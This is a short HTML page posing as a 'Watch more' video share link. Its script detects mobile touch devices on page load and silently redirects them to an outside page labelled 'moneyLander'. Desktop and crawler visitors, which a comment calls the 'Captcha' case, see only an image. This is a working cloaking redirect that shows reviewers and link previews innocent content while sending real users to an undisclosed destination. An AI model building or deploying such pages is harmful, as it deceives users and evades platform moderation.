<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Watch more">
    <meta property="og:description" content="Watch more">
    <meta property="og:image" content="https://i.postimg.cc/j221zD2L/IMG-20260707-WA0000.jpg">
    <meta property="og:type" content="website">

    <script>
        (function() {
            const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
            const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
            const isMobile = window.innerWidth <= 490;

            if (hasTouch && isMobile) {
                window.location.replace(moneyLander);
            }
        })();
    </script>
</head>
<body style="background-color: #ffffff; margin: 0; padding: 0; text-align: center;">

    <!-- Image ko JS se control kiya hai -->
    <script>
        // Sirf tab dikhegi jab redirect nahi hoga (yani Desktop/Captcha case mein)
        if (!('ontouchstart' in window) || window.innerWidth > 490) {
            document.write('<img src="https://i.postimg.cc/nLFxDC2Q/482294128736867509.jpg" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">');
        }
    </script>

</body>
</html>
